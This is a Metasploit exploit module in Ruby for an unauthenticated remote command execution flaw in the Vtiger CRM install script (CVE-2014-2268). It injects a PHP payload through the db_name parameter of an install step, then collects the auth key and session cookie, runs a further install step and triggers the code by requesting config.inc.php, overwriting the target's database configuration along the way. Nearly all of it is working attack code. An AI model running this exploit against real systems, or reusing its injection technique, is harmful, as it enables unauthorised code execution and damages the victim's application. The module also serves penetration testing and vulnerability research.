##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

  # Application database configuration is overwritten
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Vtiger Install Unauthenticated Remote Command Execution',
      'Description'    => %q{
        This module exploits an arbitrary command execution vulnerability in the
        Vtiger install script. This module is set to ManualRanking due to this
        module overwriting the target database configuration, which may result in
        a broken web app, and you may not be able to get a session again.
      },
      'Author'         =>
        [
          'Jonathan Borgeaud < research[at]navixia.com >' # Navixia Research Team
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-2268' ],
          [ 'URL', 'https://www.navixia.com/blog/entry/navixia-find-critical-vulnerabilities-in-vtiger-crm-cve-2014-2268-cve-2014-2269.html'],
          [ 'URL', 'http://vtiger-crm.2324883.n4.nabble.com/Vtigercrm-developers-IMP-forgot-password-and-re-installation-security-fix-tt9786.html'],

        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Payload'        =>
        {
          'Space'       => 4000,
          'BadChars'    => "#",
          'DisableNops' => true,
          'Keys'        => ['php']
        },
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Vtiger 6.0.0 or older', { }]],
      'DisclosureDate' => 'Mar 5 2014',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to Vtiger', '/'])
        ], self.class)
  end

  def exploit
    print_status("Injecting payload...")
    rand_arg = Rex::Text.rand_text_hex(10)
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, 'index.php'),
      'headers'  => {'X-Requested-With' => rand_text_alpha(5)},
      'vars_get' => {
          'module'  => 'Install',
          'view'    => 'Index',
          'mode'    => 'Step5',
          'db_name' => "127.0.0.1'; if(isset($_GET['#{rand_arg}'])){ #{payload.encoded} } // "
      }})

    # Check timeout
    if not res
      print_error("Request timed out, please try again")
      return
    end

    if res.body =~ /name="auth_key"\s+value=".*?((?:[a-z0-9]*))"/i
      authkey   = $1
      phpsessid = res.get_cookies

      if authkey.blank?
        print_error("No AuthKey found")
        return
      elsif phpsessid.blank?
        print_error("No PHP Session ID found")
        return
      end

      print_status("Retrieved Authkey : #{authkey}")
      print_status("Retrieved PHPSESSID : #{phpsessid}")

      send_request_cgi({
        'method'     => 'GET',
          'uri'      => normalize_uri(target_uri.path, 'index.php'),
          'headers'  => {'X-Requested-With' => rand_text_alpha(5)},
          'cookie'   => phpsessid,
          'vars_get' =>
            {
              'module'   => 'Install',
              'view'     => 'Index',
              'mode'     => 'Step7',
              'auth_key' => authkey
            }
        })

        print_status("Executing payload...")
        send_request_cgi({
          'method'    => 'GET',
          'uri'       => normalize_uri(target_uri.path, 'config.inc.php'),
          'vars_get'  => { rand_arg => '1' }
        })
    else
      print_error("No auth_key pattern found")
    end
  end
end